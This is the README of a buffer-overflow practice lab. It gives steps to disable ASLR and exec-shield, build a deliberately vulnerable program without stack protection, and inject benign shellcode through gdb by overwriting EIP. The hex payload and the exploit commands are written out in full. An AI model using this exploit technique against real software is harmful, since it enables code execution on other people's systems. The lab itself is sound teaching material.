#PREPARE!
To start practicing injecting shell code in this repo you have:
- `shellcode.asm` - simple asm code that print one word. it doesn't create any `\x00` bytes so you'll not have any problems with `strcpy()`.
- `victim.c` - vulnerable program.
- `shellcode.c` - executor for our `shellcode.asm` 

First prepare your OS:

Using any text editor write to `/etc/sysctl.conf` next lines:
```
kernel.randomize_va_space = 0
kernel.exec-shield = 0
```

And run `$ sudo sysctl -p`

After that run `ulimit -c unlimited`

#FIGHT
Run `make` to compile all the files and you will get something like 
```
rm -f shellcode victim *.o *~
gcc -g -z execstack -Wall -fno-stack-protector -o victim victim.c
nasm -f elf shellcode.asm
ld -o shellcode shellcode.o
sh getshell.sh
\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x18\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x61\x63\x6b
```

The last lines after sh.getshell is your shellcode to execute wherever you want.

To completely finish your action you can do next steps:

1. run `gdb victim`.

2. exec victim with params (count of "A" "B" "C" letters you must find experimentally to have `$EIP` be filled with only letter "B" - 42 code): 
  ```
  (gdb) r `python -c 'print "A"*10 + "B"*4 + "C"*30'`
  Starting program: /root/lab/victim `python -c 'print "A"*12 + "B"*4 + "C"*30'`
  So... The End...
  AAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
  
  Program received signal SIGSEGV, Segmentation fault.
  0x42424242 in ?? ()
```
3. Replace `"C"*30` with your shellcode you got after make
  ```
  (gdb) r `python -c 'print "A"*12 + "B"*4 + "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x18\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x61\x63\x6b"'`
  Starting program: /root/lab/victim `python -c 'print "A"*12 + "B"*4 + "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x18\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x61\x63\x6b"'`
  So... The End...
  AAAAAAAAAAAABBBB�1�1�1�1ɰ�Y�1�1������hack
  
  Program received signal SIGSEGV, Segmentation fault.
  0x42424242 in ?? ()
  ``` 
4. After that you need to replace `"B"*4` with return address. You can look for it in stack or just try to use address from `$ESP` (cause we've put our code right after current program).
  
  ```
  (gdb) x/256xb $esp
  0xbffffca0: 0xeb    0x19    0x31    0xc0    0x31    0xdb    0x31    0xd2
  0xbffffca8: 0x31    0xc9    0xb0    0x04    0xb3    0x01    0x59    0xb2
  0xbffffcb0: 0x18    0xcd    0x80    0x31    0xc0    0xb0    0x01    0x31
  0xbffffcb8: 0xdb    0xcd    0x80    0xe8    0xe2    0xff    0xff    0xff
  ```
5. So **0xbffffca0** is our new return address. Just replace `"B"*4` with this address reversed. Here we go!
  
  ```
  Starting program: /root/lab/victim `python -c 'print "A"*12 + "\xa0\xfc\xff\xbf" + "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x18\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x61\x63\x6b"'`
  So... The End...
  AAAAAAAAAAAA�����1�1�1�1ɰ�Y�1�1������hack
  hack
  Program exited normally.
  (gdb)
  ```

After all you can find and try to inject any other shellcode from (Shell Storm)[http://shell-storm.org/shellcode/]
#Requirements
- gcc
- make
- objdump
- nasm
- python or perl

#Thanks
[LifeDJIK](https://github.com/LifeDJIK) for helping to understand some parts.